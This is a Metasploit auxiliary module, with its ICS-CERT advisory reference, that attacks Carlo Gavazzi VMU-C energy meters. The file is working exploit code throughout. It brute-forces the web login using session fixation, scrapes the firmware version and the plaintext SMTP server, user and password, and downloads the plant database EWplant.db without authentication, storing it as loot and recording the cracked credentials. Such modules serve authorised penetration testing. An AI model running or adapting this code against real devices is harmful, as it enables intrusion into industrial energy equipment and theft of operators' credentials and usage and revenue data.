##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name' => 'Carlo Gavazzi Energy Meters - Login Brute Force, Extract Info and Dump Plant Database',
      'Description' => %{
        This module scans for Carlo Gavazzi Energy Meters login portals, performs a login brute force attack, enumerates device firmware version, and attempt to extract the SMTP configuration. A valid, admin privileged user is required to extract the SMTP password. In some older firmware versions, the SMTP config can be retrieved without any authentication. The module also exploits an access control vulnerability which allows an unauthenticated user to remotely dump the database file EWplant.db. This db file contains information such as power/energy utilization data, tariffs, and revenue statistics. Vulnerable firmware versions include - VMU-C EM prior to firmware Version A11_U05 and VMU-C PV prior to firmware Version A17.
      },
      'References' =>
        [
          ['URL', 'https://ics-cert.us-cert.gov/advisories/ICSA-17-012-03']
        ],
      'Author' =>
         [
           'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
         ],
      'License' => MSF_LICENSE,
      'DefaultOptions' =>
         {
           'SSL' => false,
           'VERBOSE' => true
         }))

    register_options(
      [
        Opt::RPORT(80),	# Application may run on a different port too. Change port accordingly.
        OptString.new('USERNAME', [true, 'A specific username to authenticate as', 'admin']),
        OptString.new('PASSWORD', [true, 'A specific password to authenticate with', 'admin'])
      ], self.class
    )
  end

  def run_host(ip)
    unless is_app_carlogavazzi?
      return
    end

    each_user_pass do |user, pass|
      do_login(user, pass)
    end
    ewplantdb
  end

  #
  # What's the point of running this module if the target actually isn't Carlo Gavazzi box
  #

  def is_app_carlogavazzi?
    begin
      res = send_request_cgi(
        {
          'uri'       => '/',
          'method'    => 'GET'
        }
      )
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
      vprint_error("#{rhost}:#{rport} - HTTP Connection Failed...")
      return false
    end

    good_response = (
      res &&
      res.code == 200 &&
      res.body.include?('Accedi') || res.body.include?('Gavazzi') || res.body.include?('styleVMUC.css') || res.body.include?('VMUC')
    )

    if good_response
      vprint_good("#{rhost}:#{rport} - Running Carlo Gavazzi VMU-C Web Management portal...")
      return true
    else
      vprint_error("#{rhost}:#{rport} - Application is not Carlo Gavazzi. Module will not continue.")
      return false
    end
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      last_attempted_at: Time.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  #
  # Brute-force the login page
  #

  def do_login(user, pass)
    vprint_status("#{rhost}:#{rport} - Trying username:#{user.inspect} with password:#{pass.inspect}")

    # Set Cookie - Box is vuln to Session Fixation. Generating a random cookie for use.
    randomvalue = Rex::Text.rand_text_alphanumeric(26)
    cookie_value = 'PHPSESSID=' + "#{randomvalue}"

    begin
      res = send_request_cgi(
        {
          'uri'       => '/login.php',
          'method'    => 'POST',
          'headers'   => {
            'Cookie' => cookie_value
          },
          'vars_post' =>
            {
              'username' => user,
              'password' => pass,
              'Entra' => 'Sign+In' # Also - 'Entra' => 'Entra' # Seen to vary in some models
            }
        }
      )

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
      vprint_error("#{rhost}:#{rport} - HTTP Connection Failed...")
      return :abort
    end

    good_response = (
      res &&
      res.code == 200 &&
      res.body.include?('Login in progress') || res.body.include?('Login in corso') &&
      res.body.match(/id="error" value="2"/) || (res.code == 302 && res.headers['Location'] == 'disclaimer.php')
    )

    if good_response
      print_good("SUCCESSFUL LOGIN - #{rhost}:#{rport} - #{user.inspect}:#{pass.inspect}")

      # Extract firmware version
      begin
        res = send_request_cgi(
          {
            'uri' => '/setupfirmware.php',
            'method' => 'GET',
            'headers' => {
              'Cookie' => cookie_value
            }
          }
        )
      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
        vprint_error("#{rhost}:#{rport} - HTTP Connection Failed...")
        return :abort
      end

      if res && res.code == 200
        if res.body.include?('Firmware Version') || res.body.include?('Versione Firmware')
          fw_ver = res.body.match(/Ver. (.*)[$<]/)[1]

          if !fw_ver.nil?
            print_good("#{rhost}:#{rport} - Firmware version #{fw_ver}...")

            report_cred(
              ip: rhost,
              port: rport,
              service_name: "Carlo Gavazzi Energy Meter [Firmware ver #{fw_ver}]",
              user: user,
              password: pass
            )
          end
        end
      end

      #
      # Extract SMTP config
      #

      begin
        res = send_request_cgi(
          {
            'uri'       => '/setupmail.php',
            'method'    => 'GET',
            'headers'   => {
              'Cookie' => cookie_value
            }
          }
        )

      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
        vprint_error("#{rhost}:#{rport} - HTTP Connection Failed...")
        return :abort
      end

      if (res && res.code == 200 && res.body.include?('SMTP'))
        dirty_smtp_server = res.body.match(/smtp" value=(.*)[$=]/)[1]
        dirty_smtp_user = res.body.match(/usersmtp" value=(.*)[$=]/)[1]
        dirty_smtp_pass = res.body.match(/passwordsmtp" value=(.*)[$=]/)[1]

        if (!dirty_smtp_server.nil?) && (!dirty_smtp_user.nil?) && (!dirty_smtp_pass.nil?)
          smtp_server = dirty_smtp_server.match(/[$"](.*)[$"]/)
          smtp_user = dirty_smtp_user.match(/[$"](.*)[$"]/)
          smtp_pass = dirty_smtp_pass.match(/[$"](.*)[$"]/)

          if (!smtp_server.nil?) && (!smtp_user.nil?) && (!smtp_pass.nil?)
            print_good("#{rhost}:#{rport} - SMTP server: #{smtp_server}, SMTP username: #{smtp_user}, SMTP password: #{smtp_pass}")
          end
        end
      else
        vprint_error("#{rhost}:#{rport} - SMTP config could not be retrieved. Check if the user has administrative privileges")
      end
      return :next_user
    else
      print_error("FAILED LOGIN - #{rhost}:#{rport} - #{user.inspect}:#{pass.inspect}")
    end
  end

  #
  # Dump EWplant.db database file - No authentication required
  #

  def ewplantdb
    begin
      res = send_request_cgi(
        {
          'uri' => '/cfg/EWplant.db',
          'method' => 'GET'
        }
      )
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
      vprint_error("#{rhost}:#{rport} - HTTP Connection Failed...")
      return :abort
    end

    if res && res.code == 200
      print_status("#{rhost}:#{rport} - dumping EWplant.db")
      print_good("#{rhost}:#{rport} - EWplant.db retrieved successfully!")
      loot_name = 'EWplant.db'
      loot_type = 'SQLite_db/text'
      loot_desc = 'Carlo Gavazzi EM - EWplant.db'
      path = store_loot(loot_name, loot_type, datastore['RHOST'], res.body , loot_desc)
      print_good("#{rhost}:#{rport} - File saved in: #{path}")
    else
      vprint_error("#{rhost}:#{rport} - Failed to retrieve EWplant.db. Set a higher HTTPCLIENTTIMEOUT and try again. Else, check if target is running vulnerable version.?")
      return
    end
  end
end
